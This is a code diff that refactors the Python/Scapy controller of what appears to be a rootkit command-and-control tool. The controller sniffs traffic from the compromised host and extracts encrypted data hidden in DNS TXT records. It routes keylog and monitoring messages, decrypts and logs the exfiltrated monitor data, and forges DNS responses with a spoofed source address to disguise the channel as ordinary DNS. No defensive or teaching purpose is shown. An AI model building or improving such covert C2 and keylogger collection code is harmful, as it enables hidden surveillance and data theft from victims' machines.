@@ -66,45 +66,41 @@ STREAM_ENCRYPTION_HANDLER.initialize_encryption_context()
 BLOCK_ENCRYPTION_HANDLER.read_key("data/fernet.key")
 
 
+def relay_dns_query(pkt):
+    forged = IP(dst="8.8.8.8")/UDP(sport=53, dport=53)/DNS(rd=1, qd=pkt[DNS].qd)
+    response = sr1(forged, verbose=0)
+    response[IP].src = f"{CONTROLLER_IP}"
+    response[IP].dst = f"{ROOTKIT_IP}"
+    send(response, verbose=0)
+
 def subprocess_packet_handler(pkt):
     """
     
     """
     if pkt[UDP].sport != 53 or pkt[UDP].dport != 53:
         return None
+    encrypted_message = pkt[UDP].ar.rdata[0]
     if pkt[IP].id == GENERAL_MSG_IDENTIFICATION:
-        # 1. Get the data in the TXT record.
-        encrypted_message = pkt[UDP].ar.rdata[0]
-        # 2. Put the data in the queue.
         QUEUE.put(encrypted_message)
-        # 3. Craft a legit query.
-        forged = IP(dst="8.8.8.8")/UDP(sport=53, dport=53)/DNS(rd=1, qd=pkt[DNS].qd)
-        # 4. sr1 the DNS query to a legit DNS server.
-        response = sr1(forged, verbose=0)
-        # 5. send the response back to the backdoor machine.
-        response[IP].src = f"{CONTROLLER_IP}"
-        response[IP].dst = f"{ROOTKIT_IP}"
-        send(response, verbose=0)
+        relay_dns_query(pkt)
     if pkt[IP].id == KEYLOG_IDENTIFICATION:
-        write_keylog_data("")
+        write_keylog_data(encrypted_message)
     if pkt[IP].id == MONITOR_IDENTIFICATION:
-        write_monitor_data(pkt[UDP].ar.rdata[0])
+        write_monitor_data(encrypted_message)
 
 def write_keylog_data(data):
     pass
 
 def write_monitor_data(data):
-    print(data)
     b = BLOCK_ENCRYPTION_HANDLER.decrypt(data)
     msg = b.decode("utf-8")
-    with open("logs/monitor.log", "w") as f:
+    with open("logs/monitor.log", "a") as f:
         f.write(msg + "\n")
 
 def subprocess_start():
     """
     """
     sniff(filter=f"ip src host {ROOTKIT_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=subprocess_packet_handler)
-
 
 def send_udp(data: str):
     """
